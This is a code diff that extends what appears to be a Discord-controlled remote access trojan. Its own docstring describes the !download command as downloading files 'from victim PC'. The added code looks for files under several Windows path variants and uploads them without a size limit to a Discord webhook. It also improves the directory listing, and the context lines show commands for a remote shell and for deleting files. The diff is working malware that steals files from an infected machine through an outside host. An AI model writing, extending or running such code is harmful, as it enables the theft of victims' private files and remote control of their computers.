@@ -330,20 +330,46 @@ def delete_file(path):
 
 def list_directory(path='.'):
     try:
+        path = os.path.expanduser(path)
+        if not os.path.exists(path):
+            return f"Path not found: {path}"
         items = os.listdir(path)
-        return "\n".join(items[:50])
+        return "\n".join(items[:100])
+    except PermissionError:
+        return f"Permission denied: {path}"
     except Exception as e:
         return str(e)
 
 def download_file(file_path):
     try:
-        if not os.path.exists(file_path):
+        # Expand user paths
+        file_path = os.path.expanduser(file_path)
+        
+        # Try common path variations
+        possible_paths = [
+            file_path,
+            file_path.replace('/', '\\'),
+            os.path.join(os.environ.get('USERPROFILE', ''), file_path),
+            os.path.join(os.environ.get('SYSTEMDRIVE', 'C:'), file_path)
+        ]
+        
+        found_path = None
+        for path in possible_paths:
+            if os.path.exists(path) and not os.path.isdir(path):
+                found_path = path
+                break
+        
+        if not found_path:
             return f"File not found: {file_path}"
-        with open(file_path, 'rb') as f:
+        
+        # Send file (no size limit)
+        with open(found_path, 'rb') as f:
             from discord import SyncWebhook, File
             webhook = SyncWebhook.from_url(WEBHOOK_URL)
-            webhook.send(file=File(f, os.path.basename(file_path)))
-        return f"Sent file: {file_path}"
+            webhook.send(file=File(f, os.path.basename(found_path)))
+        return f"Sent file: {found_path}"
+    except PermissionError:
+        return f"Permission denied: {file_path}"
     except Exception as e:
         return f"Download failed: {str(e)}"
 
@@ -454,15 +480,64 @@ async def shell_input(ctx, *, command):
 
 @bot.command()
 async def ls(ctx, path='.'):
-    output = list_directory(path)
-    await send_webhook(f"Listing {path}:\n{output[:1900]}")
-    await ctx.send("Command sent.")
+    """List directory contents. Usage: !ls C:\"""
+    try:
+        path = os.path.expanduser(path)
+        if not os.path.exists(path):
+            await ctx.send(f"Path not found: {path}")
+            return
+        
+        items = os.listdir(path)
+        output = "\n".join(items[:100])
+        await send_webhook(f"Listing {path}:\n{output[:1900]}")
+        await ctx.send(f"Directory listing sent to webhook")
+    except PermissionError:
+        await ctx.send(f"Permission denied: {path}")
+    except Exception as e:
+        await ctx.send(f"Error: {str(e)}")
 
 @bot.command()
 async def download(ctx, *, file_path):
-    output = download_file(file_path)
-    await send_webhook(output)
-    await ctx.send("Command sent.")
+    """Download file from victim PC. Usage: !download C:\file.txt"""
+    await ctx.send(f"Attempting to download: {file_path}")
+    
+    try:
+        # Expand user paths
+        file_path = os.path.expanduser(file_path)
+        
+        # Try common path variations
+        possible_paths = [
+            file_path,
+            file_path.replace('/', '\\'),
+            os.path.join(os.environ.get('USERPROFILE', ''), file_path),
+            os.path.join(os.environ.get('SYSTEMDRIVE', 'C:'), file_path)
+        ]
+        
+        found_path = None
+        for path in possible_paths:
+            if os.path.exists(path) and not os.path.isdir(path):
+                found_path = path
+                break
+        
+        if not found_path:
+            await ctx.send(f"File not found: {file_path}")
+            return
+        
+        # Send file (no size limit)
+        with open(found_path, 'rb') as f:
+            from discord import SyncWebhook, File
+            webhook = SyncWebhook.from_url(WEBHOOK_URL)
+            webhook.send(file=File(f, os.path.basename(found_path)))
+        
+        await send_webhook(f"File downloaded: {found_path}")
+        await ctx.send(f"File sent to webhook: {found_path}")
+        
+    except PermissionError:
+        await ctx.send(f"Permission denied: {file_path}")
+        await send_webhook(f"Download failed: Permission denied for {file_path}")
+    except Exception as e:
+        await ctx.send(f"Download failed: {str(e)}")
+        await send_webhook(f"Download error: {str(e)}")
 
 @bot.command()
 async def delete(ctx, *, path):
